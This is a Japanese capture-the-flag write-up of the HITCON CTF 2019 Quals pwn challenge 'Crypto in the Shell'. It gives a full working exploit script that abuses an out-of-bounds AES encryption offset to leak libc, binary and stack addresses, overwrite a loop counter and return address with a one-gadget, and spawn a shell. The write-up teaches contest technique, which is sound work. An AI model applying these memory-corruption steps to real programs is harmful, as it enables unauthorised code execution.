# [pwn 284pts] Crypto in the Shell - HITCON CTF 2019 Quals
64ビットでいろいろ有効です。
```
$ checksec -f chall
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   85 Symbols     Yes      0               4       chall
```
空のバッファと16バイトの鍵(中身不明)があり、指定したオフセットから指定したバイト数だけAESで暗号化できます。オフセットに制限は無いので何とかなりそうです。暗号化された結果は表示されます。

とりあえず鍵が無いと始まらないのでkey自体を暗号化します。暗号化した結果は分かるので、これにより新しい既知の鍵が作られます。次にstderrを暗号化し、鍵を使って元に戻してlibc leakします。同様にbss周辺にあるproc base付近のポインタをleakします。また、environからstackのアドレスを取り出します。
```python
# set new key
addr_buf = elf.symbol("buf")
addr_key = elf.symbol("AESkey")
addr_stderr = elf.section(".bss") + 0x20
key = encrypt(addr_key - addr_buf, 15)
logger.info(b"New key = " + key)

# leak libc
leak = decrypt(key, encrypt(addr_stderr - addr_buf, 15))
libc_base = u64(leak) - libc.symbol("_IO_2_1_stderr_")
logger.info("libc base = " + hex(libc_base))

# leak proc
leak = decrypt(key, encrypt(0x202000 - addr_buf, 15))
proc_base = u64(leak[8:]) - 0x202008
logger.info("proc base = " + hex(proc_base))

# leak stack
addr_environ = libc_base + libc.symbol("environ")
addr_buf += proc_base
leak = decrypt(key, encrypt(addr_environ - addr_buf, 15))
stack_i = u64(leak) - 0x120
logger.info("stack i = " + hex(stack_i))
```
いい感じです。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=22192)
[+] <module>: b'New key = \xe8\xc8D\xf5W\xcf\x1a\xa1=\xe2\xd3\xe8\x10\xf1\x9f\xed'
[+] <module>: libc base = 0x7f78f771e000
[+] <module>: proc base = 0x557d5fb52000
[+] <module>: stack i = 0x7ffe539bece8
```
スタックのアドレスが手に入ったのでループカウンタを巨大な値になるよう変更しましょう。現状では0x20回しかループできません。
```python
# overwrite i
addr_dl_fini = libc_base + 0x4019a0
cnt = 4
for i in range(0x20 - 4):
    new_i = u32(test_encrypt(key, p64(addr_dl_fini) + p32(cnt) + p32(1))[8:12])
    if new_i >> 31:
        logger.info("i = " + str(-((new_i ^ 0xffffffff) + 1)))
        encrypt(stack_i - 8 - addr_buf, 15)
        break
    else:
        key = encrypt(addr_key - addr_buf, 15)
        logger.info(b"New key = " + key)
        cnt += 1
```
これで何度でも暗号化できます。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=23650)
[+] <module>: b'New key = \xe8\xc8D\xf5W\xcf\x1a\xa1=\xe2\xd3\xe8\x10\xf1\x9f\xed'
[+] <module>: libc base = 0x7ffff79e4000
[+] <module>: proc base = 0x555555554000
[+] <module>: stack i = 0x7fffffffdbf8
[+] <module>: i = -1549953052
```
あとはリターンアドレスがone gadgetを向くように変更すればOKです。
```python
# overwrite return address to one gadget
addr_retaddr = stack_i + 0x30
buf = p64(libc_base + 0x21b97) + p64(1) + p64(stack_i + 0x110)
addr_one_gadget = libc_base + 0x10a38c
for i in range(8):
    while True:
        new_buf = encrypt(addr_retaddr + i - addr_buf, 15)
        buf = buf[:i] + new_buf + buf[i+16:]
        if new_buf[0] == (addr_one_gadget >> (i*8)) & 0xff:
            break
logger.info("Successfully set one_gadget")
```
と思っていたのですが甘かった。environを破壊したのでexecveの引数がぶっ壊れます。
```
 ► 0x7ffff7aee3a2 <exec_comm+2530>    call   execve <0x7ffff7ac8e30>
        path: 0x7ffff7b97e9a ◂— 0x68732f6e69622f /* u'/bin/sh' */
        argv: 0x7fffffffdca0 ◂— 0x0
        envp: 0x55068c726ff860cb
```
ということでenvironをNULLに戻しましょう。全体のexploitコードは次のようになります。
```python
from ptrlib import *
from Crypto.Cipher import AES

def encrypt(offset, size):
    sock.sendlineafter(":", str(offset))
    sock.sendlineafter(":", str(size))
    result = sock.recv((size & ~0xf) + 16)
    return result

def test_encrypt(key, msg):
    return AES.new(key, AES.MODE_CBC, iv=b'\0'*16).encrypt(msg)

def decrypt(key, msg):
    return AES.new(key, AES.MODE_CBC, iv=b'\0'*16).decrypt(msg)

libc = ELF("./libc.so.6")
elf = ELF("./chall")
sock = Process("./chall")
#sock = Socket("3.113.219.89", 31337)

# set new key
addr_buf = elf.symbol("buf")
addr_key = elf.symbol("AESkey")
addr_stderr = elf.section(".bss") + 0x20
key = encrypt(addr_key - addr_buf, 15)
logger.info(b"New key = " + key)

# leak libc
leak = decrypt(key, encrypt(addr_stderr - addr_buf, 15))
libc_base = u64(leak) - libc.symbol("_IO_2_1_stderr_")
logger.info("libc base = " + hex(libc_base))

# leak proc
leak = decrypt(key, encrypt(0x202000 - addr_buf, 15))
proc_base = u64(leak[8:]) - 0x202008
logger.info("proc base = " + hex(proc_base))

# leak stack
addr_environ = libc_base + libc.symbol("environ")
addr_buf += proc_base
addr_key += proc_base
new_environ = encrypt(addr_environ - addr_buf, 15)
leak = decrypt(key, new_environ)
stack_i = u64(leak) - 0x120
logger.info("stack i = " + hex(stack_i))

# overwrite i
addr_dl_fini = libc_base + 0x4019a0
cnt = 4
for i in range(0x20 - 4):
    new_i = u32(test_encrypt(key, p64(addr_dl_fini) + p32(cnt) + p32(1))[8:12])
    if new_i >> 31:
        logger.info("i = " + str(-((new_i ^ 0xffffffff) + 1)))
        encrypt(stack_i - 8 - addr_buf, 15)
        break
    else:
        key = encrypt(addr_key - addr_buf, 15)
        logger.info(b"New key = " + key)
        cnt += 1

# overwrite return address to one gadget
addr_retaddr = stack_i + 0x30
buf = p64(libc_base + 0x21b97) + p64(1) + p64(stack_i + 0x110)
addr_one_gadget = libc_base + 0x10a38c
for i in range(8):
    while True:
        new_buf = encrypt(addr_retaddr + i - addr_buf, 15)
        buf = buf[:i] + new_buf + buf[i+16:]
        if new_buf[0] == (addr_one_gadget >> (i*8)) & 0xff:
            break
logger.info("Successfully set one_gadget")

# overwrite environ with NULL
buf = new_environ + p64(0)
for i in range(8):
    while True:
        new_buf = encrypt(addr_environ + i - addr_buf, 15)
        buf = buf[:i] + new_buf + buf[i+16:]
        if new_buf[0] == 0:
            break
logger.info("Successfully set environ")

# get the shell!
sock.sendlineafter(":", "+")
sock.interactive()
```

ええやん。
```
$ python solve.py 
[+] __init__: Successfully created new process (PID=26028)
[+] <module>: b'New key = \xe8\xc8D\xf5W\xcf\x1a\xa1=\xe2\xd3\xe8\x10\xf1\x9f\xed'
[+] <module>: libc base = 0x7ffff79e4000
[+] <module>: proc base = 0x555555554000
[+] <module>: stack i = 0x7fffffffdbf8
[+] <module>: i = -1549953052
[+] <module>: Successfully set one_gadget
[+] <module>: Successfully set environ
[ptrlib]$ id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
```

# 感想
競技中はなぜかenvironでスタックをリークするのを思いつかなくて詰んでた。面白かったです。